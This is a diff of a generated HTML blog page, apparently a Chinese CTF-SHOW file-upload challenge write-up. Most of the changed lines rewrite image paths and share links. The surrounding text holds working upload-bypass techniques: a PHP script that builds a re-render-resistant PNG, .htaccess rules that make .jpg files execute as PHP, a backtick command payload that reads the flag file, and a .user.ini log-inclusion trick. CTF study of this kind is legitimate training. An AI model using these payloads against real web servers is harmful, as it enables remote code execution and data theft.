+<p><img src="/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220906102747456.png" alt="image-20220906102747456"></p>
 </li>
 <li><p>针对返回php代码，这里起一个flask服务，返回php代码</p>
-<p><img src="/image-20220906102719476.png" alt="image-20220906102719476"></p>
-<p><img src="/image-20220906103236164.png" alt="image-20220906103236164"></p>
+<p><img src="/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220906102719476.png" alt="image-20220906102719476"></p>
+<p><img src="/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220906103236164.png" alt="image-20220906103236164"></p>
 </li>
 </ol>
 </li>
@@ -275,13 +281,13 @@
 <p>直接脚本小子</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">    <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">    <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">    <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;/Users/racerz/Desktop/2.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/image-20220907210841653.png" alt="image-20220907210841653"></p>
+<p><img src="/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220907210841653.png" alt="image-20220907210841653"></p>
 </li>
 </ol>
-<p><img src="/image-20220907211524462.png" alt="image-20220907211524462"></p>
+<p><img src="/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220907211524462.png" alt="image-20220907211524462"></p>
 <ol start="165">
 <li><p>jpg二次渲染</p>
-<img src="/image-20220907233253334.png" alt="image-20220907233253334" style="zoom:50%;" />
+<img src="/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220907233253334.png" alt="image-20220907233253334" style="zoom:50%;">
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br></pre></td></tr></table></figure></li>
 </ol>
@@ -289,28 +295,28 @@
 
 <p>特别说明，脚本生效需要经过二次渲染之后才可进行修改，并且并不是所有的jpg图片都可以成功</p>
 <p>天知道我尝试了多少次….</p>
-<p><img src="/image-20220908144016297.png" alt="image-20220908144016297"></p>
+<p><img src="/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220908144016297.png" alt="image-20220908144016297"></p>
 <ol start="166">
 <li><p>zip文件上传</p>
-<img src="/image-20220908143025400.png" alt="image-20220908143025400" style="zoom:50%;" /></li>
+<img src="/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220908143025400.png" alt="image-20220908143025400" style="zoom:50%;"></li>
 </ol>
 <p>但好像是只做了文件类型MIME检验</p>
 <p>那就直接修改包内容类型为<code>application/x-zip-compressed</code>即可</p>
 <ol start="167">
 <li><p>文件上传 httpd</p>
-<img src="/image-20220908143938862.png" alt="image-20220908143938862" style="zoom:50%;" />
+<img src="/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220908143938862.png" alt="image-20220908143938862" style="zoom:50%;">
 
 <p>前端有检验只允许上传jpg文件</p>
 <p>根据httpd提示可知这是.htaccess文件中的一个配置，所以直接使用.htaccess文件上传</p>
 <p><strong>payload</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># .htaccess文件配置</span><br><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line"># 或者</span><br><span class="line">&lt;FilesMatch &quot;jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
 
-<img src="/image-20220908144843577.png" alt="image-20220908144843577" style="zoom:50%;" />
+<img src="/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220908144843577.png" alt="image-20220908144843577" style="zoom:50%;">
 
 <p>之后上传含有恶意php代码的jpg文件即可</p>
 </li>
 <li><p>文件上传 基础免杀</p>
-<img src="/image-20220908145303461.png" alt="image-20220908145303461" style="zoom:50%;" />
+<img src="/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220908145303461.png" alt="image-20220908145303461" style="zoom:50%;">
 
 <p>这里应该就是针对命令执行语句的过滤吧，如果被过滤了的话就直接访问返回404了</p>
 <p>这题刚开始试不出来，去wp里翻到了源码</p>
@@ -319,18 +325,18 @@
 <p>所以其实没啥，没过滤反引号和echo，直接输出就行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo `tac ../fl*`; ?&gt;</span><br></pre></td></tr></table></figure>
 
-<img src="/image-20220908153657940.png" alt="image-20220908153657940" style="zoom:50%;" /></li>
+<img src="/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220908153657940.png" alt="image-20220908153657940" style="zoom:50%;"></li>
 <li><p>文件上传 高级免杀</p>
 <p>前端限制为zip，后端限制了MIME为png</p>
-<img src="/image-20220908153852171.png" alt="image-20220908153852171" style="zoom:50%;" />
+<img src="/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220908153852171.png" alt="image-20220908153852171" style="zoom:50%;">
 
 <p>过滤了<code>&lt;?</code>，沿用日志包含的思路</p>
 <p>先上传.user.ini</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
 
-<p><img src="/image-20220908155414030.png" alt="image-20220908155414030"></p>
+<p><img src="/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220908155414030.png" alt="image-20220908155414030"></p>
 <p>后上传一个php文件，用来包含日志文件并在访问时解析其中的恶意代码</p>
-<p><img src="/image-20220908154758370.png" alt="image-20220908154758370"></p>
+<p><img src="/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220908154758370.png" alt="image-20220908154758370"></p>
 </li>
 <li><p>文件上传 终极免杀</p>
 <p>虽说终极，但是和上一题同理</p>
@@ -367,16 +373,16 @@
     <div id="share-footer" style="display: none">
       <ul>
   <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&text="><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title="><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&is_video=false&description="><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=&body=Check out this article: https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title="><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title="><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title="><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title="><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&name=&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&t="><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&text=CTFSHOW-文件上传"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=CTFSHOW-文件上传"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&is_video=false&description=CTFSHOW-文件上传"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CTFSHOW-文件上传&body=Check out this article: https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=CTFSHOW-文件上传"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=CTFSHOW-文件上传"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=CTFSHOW-文件上传"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&title=CTFSHOW-文件上传"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&name=CTFSHOW-文件上传&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://racerz-fighting.github.io/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/&t=CTFSHOW-文件上传"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
